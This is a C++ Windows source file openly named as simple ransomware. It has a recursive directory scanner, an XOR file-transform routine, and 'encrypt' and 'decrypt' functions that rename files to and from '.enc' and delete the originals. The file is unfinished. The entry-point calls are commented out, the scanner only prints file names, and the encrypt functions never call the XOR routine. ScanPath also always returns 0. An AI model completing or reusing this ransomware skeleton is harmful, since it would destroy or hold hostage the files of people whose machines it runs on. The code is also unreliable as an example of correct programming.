// Simple-Ransomware.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

BOOL MyEncryptFile(LPTSTR, LPVOID);
BOOL MyDecryptFile(LPTSTR, LPVOID);
DWORD ScanPath(LPTSTR);

int _tmain(int argc, _TCHAR* argv[])
{
	//ScanPath(_T("C:\\TDDownload"));
	//MyEncryptFile(_T("C:\\testingCode\\test.txt"), NULL);
	//MyDecryptFile(_T("C:\\testingCode\\test.txt.enc"), NULL);
	return 0;
}

BOOL XORFile(LPTSTR lpExistingFileName, LPTSTR lpNewFileName, LPVOID lpKey)
{
	BOOL bResult = FALSE;
	if(!lpKey)
	{
		return bResult;
	}
	HANDLE hSrc, hDst;
	TCHAR mesg[MAX_PATH];
	DWORD dwKey = *((DWORD *) lpKey);
	hSrc = CreateFile(lpExistingFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hSrc != INVALID_HANDLE_VALUE)
	{
		hDst = CreateFile(lpNewFileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hDst != INVALID_HANDLE_VALUE)
		{
			bResult = TRUE;
			BYTE Buffer[MAX_PATH];
			DWORD ReadCount, WriteCount;
			while(ReadFile(hSrc, Buffer, MAX_PATH, &ReadCount, NULL) && ReadCount > 0)
			{
				for(int i = 0; i < ReadCount; i++)
				{
					Buffer[i] = Buffer[i] ^ dwKey;
				}
				if(!WriteFile(hDst, Buffer, ReadCount, &WriteCount, NULL) || ReadCount != WriteCount)
				{
					bResult = FALSE;
					break;
				}
			}
			CloseHandle(hDst);
		}
		else
		{
			bResult = FALSE;
		}
		CloseHandle(hSrc);
	}
	else
	{
		bResult = FALSE;
	}
	return bResult;
}

BOOL MyEncryptFile(LPTSTR lpFileName, LPVOID EncKey)
{
	TCHAR szOutputFile[MAX_PATH];
	size_t length_of_arg;
	StringCchPrintf(szOutputFile, MAX_PATH - 1, _T("%s.enc"), lpFileName);
	StringCchLength(szOutputFile, MAX_PATH, &length_of_arg);
	if(length_of_arg <= (MAX_PATH - 3))
	{
		_tprintf(_T("encoding %s\n"), lpFileName);
		if(CopyFile(lpFileName, szOutputFile, TRUE))
		{
			if(DeleteFile(lpFileName))
			{
				return TRUE;
			}
		}
	}
	
	return FALSE;
}

BOOL MyDecryptFile(LPTSTR lpFileName, LPVOID DncKey)
{
	TCHAR szOutputFile[MAX_PATH];
	size_t length_of_arg;
	//StringCchPrintf(szOutputFile, MAX_PATH - 1, _T("%s.enc"), lpFileName);
	StringCchCopy(szOutputFile, MAX_PATH, lpFileName);
	TCHAR *ptr = _tcsrchr(szOutputFile, '.');
	if(ptr && !_tcsicmp(ptr, _T(".enc")))
	{
		*ptr = '\0';
		_tprintf(_T("encoding %s\n"), szOutputFile);
		if(CopyFile(lpFileName, szOutputFile, TRUE))
		{
			if(DeleteFile(lpFileName))
			{
				return TRUE;
			}
		}
	}
	
	return FALSE;
}

DWORD ScanPath(LPTSTR lpPath)
{			
	WIN32_FIND_DATA ffd;
	//LARGE_INTEGER filesize;
	TCHAR szDir[MAX_PATH];
	size_t length_of_arg;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	DWORD dwError = 0;
	DWORD dwCount = 0;
	DWORD dwFileAttrib = GetFileAttributes(lpPath);

	if(dwFileAttrib & FILE_ATTRIBUTE_DIRECTORY)
	{
		// Check that the input path plus 3 is not longer than MAX_PATH.
		// Three characters are for the "\*" plus NULL appended below.

		StringCchLength(lpPath, MAX_PATH, &length_of_arg);

		if (length_of_arg > (MAX_PATH - 3))
		{
			printf("length_of_arg > (MAX_PATH - 3)");
			return (0);
		}

		// Prepare string for use with FindFile functions.  First, copy the
		// string to a buffer, then append '\*' to the directory name.

		StringCchCopy(szDir, MAX_PATH, lpPath);
		StringCchCat(szDir, MAX_PATH, TEXT("\\*"));

		// Find the first file in the directory.

		if ((hFind = FindFirstFile(szDir, &ffd)) == INVALID_HANDLE_VALUE) 
		{
			dwError = GetLastError();
			printf("INVALID_HANDLE_VALUE");
			return 0;
		}

		do
		{
			if(!_tcscmp(ffd.cFileName, _T(".")) || !_tcscmp(ffd.cFileName, _T("..")))
			{
				continue;
			}
			TCHAR szFullPath[MAX_PATH];
			StringCchPrintf(szFullPath, MAX_PATH - 1, _T("%s\\%s"), lpPath, ffd.cFileName);
			if(length_of_arg <= (MAX_PATH - 3))
			{
				dwCount += ScanPath(szFullPath);
			}
			//printf("hi");
			//_tprintf(_T("%s\n"), ffd.cFileName);
		}
		while (FindNextFile(hFind, &ffd) != 0);

		dwError = GetLastError();
		FindClose(hFind);
	}
	else
	{
		//Add encryption / decryption fucntion here
		_tprintf(_T("encoding %s\n\n"), lpPath);
		dwCount++;
	}
	return 0;
}